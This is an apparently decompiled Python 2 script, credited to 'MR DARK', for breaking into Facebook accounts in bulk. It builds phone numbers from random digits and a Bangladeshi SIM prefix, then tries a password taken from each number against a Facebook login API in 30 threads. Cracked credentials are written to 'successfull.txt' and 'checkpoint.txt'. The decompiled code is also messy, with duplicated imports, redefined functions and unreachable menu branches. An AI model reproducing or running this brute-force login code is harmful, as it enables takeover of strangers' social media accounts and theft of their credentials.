# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import time
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle([
        '\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa110%',
        '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa120%',
        '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa130%',
        '\x1b[1;94m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa140%',
        '\x1b[1;95m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa150%',
        '\x1b[1;96m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa160%',
        '\x1b[1;97m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa170%',
        '\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa180%',
        '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa190%',
        '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x88\x9a100%']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93m   PLEASE WAIT LODGING  ' + c)
        sys.stdout.flush()
        time.sleep(0.25)
    

t = threading.Thread(target = animate)
t.start()
time.sleep(2.5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Back'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1e-05)
    


def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
    
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
    

logo1 = """\x1b[1;32m
  __   __   _____      _____    _____   _____   _    _  
 (__)_(__) (_____)    (_____)  (_____) (_____) (_)  (_) 
(_) (_) (_)(_)__(_)   (_)  (_)(_)___(_)(_)__(_)(_)_(_)  
(_) (_) (_)(_____)    (_)  (_)(_______)(_____) (____)   
(_)     (_)( ) ( )    (_)__(_)(_)   (_)( ) ( ) (_) (_)  
(_)     (_)(_)  (_)   (_____) (_)   (_)(_)  (_)(_)  (_)                              
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;92m MR DARK
\033[1;92m FACEBOOK\033[1;94m :\033[1;93m MOHAMMAD JISAN
\033[1;93m GITHIB\033[1;92m   : \033[1;91mJISAN-404
\033[1;94m TOOLS  \033[1;93m  : \033[1;94mBANGLADESHI 08 DIGIT
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________"""
logo = """\x1b[1;32m
  __   __   _____      _____    _____   _____   _    _  
 (__)_(__) (_____)    (_____)  (_____) (_____) (_)  (_) 
(_) (_) (_)(_)__(_)   (_)  (_)(_)___(_)(_)__(_)(_)_(_)  
(_) (_) (_)(_____)    (_)  (_)(_______)(_____) (____)   
(_)     (_)( ) ( )    (_)__(_)(_)   (_)( ) ( ) (_) (_)  
(_)     (_)(_)  (_)   (_____) (_)   (_)(_)  (_)(_)  (_)                              
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;92m MR DARK
\033[1;92m FACEBOOK\033[1;94m :\033[1;93m MOHAMMAD JISAN
\033[1;93m GITHIB\033[1;92m   : \033[1;91mJISAN-404
\033[1;94m TOOLS  \033[1;93m  : \033[1;94mBANGLADESHI 08 DIGIT
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________"""
print """\x1b[1;32m
  __   __   _____      _____    _____   _____   _    _  
 (__)_(__) (_____)    (_____)  (_____) (_____) (_)  (_) 
(_) (_) (_)(_)__(_)   (_)  (_)(_)___(_)(_)__(_)(_)_(_)  
(_) (_) (_)(_____)    (_)  (_)(_______)(_____) (____)   
(_)     (_)( ) ( )    (_)__(_)(_)   (_)( ) ( ) (_) (_)  
(_)     (_)(_)  (_)   (_____) (_)   (_)(_)  (_)(_)  (_)                              
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;92m MR DARK
\033[1;92m FACEBOOK\033[1;94m :\033[1;93m MOHAMMAD JISAN
\033[1;93m GITHIB\033[1;92m   : \033[1;91mJISAN-404
\033[1;94m TOOLS  \033[1;93m  : \033[1;94mBANGLADESHI 08 DIGIT
\033[1;91m__________\033[1;92m___________\033[1;93m___________\033[1;94m___________\033[1;95m___________"""
jalan(' ')

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
    


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
    

os.system('clear')

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
    

os.system('clear')
jalan('\x1b[1;31m\x1b[1;96mdone\x1b[1;31m!')
os.system('clear')

def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(0.1)
    

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import getpass
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)
        os.system('clear')
    
    os.system('clear')
    print logo
    jalan('')

psb('')
for n in range(789):
    nmbr = random.randint(11111111, 99999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install requests')


try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)
    


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3 / 200)
    


def t():
    time.sleep(1)


def cb():
    os.system('clear')

back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')
os.system('clear')
print logo

def menu():
    jalan('\x1b[1;91m    [1]  \x1b[1;91mSTART HACKING\n\x1b[1;33m    [2]\x1b[1;32m  PLEASE FOLLOW MY PAGE\n\x1b[1;33m    [3] \x1b[1;93m HELP')
    jalan('    \x1b[1;94m[0] \x1b[1;34m EXIT                         ')
    jalan('  \x1b[1;35m  [\x1b[1;95m4\x1b[1;35m] \x1b[1;35m TOOL UPDATE')
    print '\x1b[1;95m\x1b[1;31m______________________________________________________'
    action()


def action():
    bch = raw_input('\x1b[1;93mCHOOSE CODE : ')
    if bch == '':
        os.system('clear')
        print '[!] sorry bro wrong input'
        action()
    elif bch == '1':
        os.system('xdg-open https://www.facebook.com/4FR1D1.143')
        os.system('clear')
        jalan('LODGING.....')
        os.system('clear')
        print logo1
        name = raw_input('    [1]\x1b[1;91m\x1b[1;91m \x1b[1;31m   TYPE ANY PASSWORD\x1b[1;31m : ')
        name = raw_input('    [2]\x1b[1;92m\x1b[1;92m \x1b[1;32m   TYPE ANY PASSWORD\x1b[1;32m : ')
        name = raw_input('    [3]\x1b[1;93m\x1b[1;93m \x1b[1;33m   TYPE ANY PASSWORD\x1b[1;33m : ')
        
        try:
            c = raw_input('\x1b[1;94m \x1b[1;34m   [*]    PLEASE BD SIM CODE: ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m018'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m016'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '4':
        os.system('clear')
        print logo1
        print ' coming soon'
    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m015'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m013'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m014'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if bch == '3':
        print logo
        os.system('xdg-open wa.me/+8801647811068')
        time.sleep(1)
        menu()
    elif bch == '2':
        print logo
        os.system('xdg-open wa.me/+8801647811068')
        time.sleep(1)
        menu()
    elif bch == '0':
        os.system('clear')
        print logo
        print '\x1b[1;33mtnxx amar tool use korar jonno ..plzzz sobay grupe a membar invite koren'
        exb()
    else:
        print '[!] Fill in correctly'
        os.system('clear')
        action()
        os.system('clear')
    xxx = str(len(id))
    psb('    [*]    \x1b[1;33mTotal id Numbers\x1b[1;33m: ' + xxx)
    time.sleep(0.5)
    psb('    [*]    \x1b[1;33mPlease wait...')
    time.sleep(0.5)
    psb('\x1b[1;96m')
    time.sleep(0.5)
    print '\x1b[1;95m\x1b[1;31m______________________________________________________'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('hacked by dark boy')
        except OSError:
            pass

        
        try:
            result = k + c + user
            digi7 = result[7:14]
            pass1 = digi7
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[DARK]\x1b[1;91m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m[Open After 7 Days]\x1b[0m \n'
                okb = open('successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[DARK-CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 7 Days]\x1b[0m \n'
                cps = open('checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)

if __name__ == '__main__':
    menu()
